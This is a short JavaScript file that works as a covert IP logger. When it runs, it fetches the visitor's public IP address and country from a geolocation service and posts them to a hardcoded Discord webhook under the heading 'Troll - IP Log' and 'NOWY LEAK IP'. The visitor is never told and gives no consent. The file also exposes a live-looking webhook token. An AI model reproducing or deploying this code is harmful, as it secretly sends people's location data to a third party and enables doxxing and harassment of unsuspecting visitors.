var webHookUrl = "https://discord.com/api/webhooks/1110666656239325204/qNgsiSmJxlX8JXUhWgvZi6H6DgmRPRrNa3xXPHJd-EQPerFGfq6XvYzgZPMuB9ab36DD";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "Troll - IP Log",
        avatar_url: "https://emojipedia-us.s3.amazonaws.com/source/skype/289/globe-showing-europe-africa_1f30d.png",
        content:    "**NOWY LEAK IP** \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**:flag_eu: Kraj:**__ \n" +
		    "`" + country + "`"
			
    }

    postRequest.send(JSON.stringify(params));

}

request();
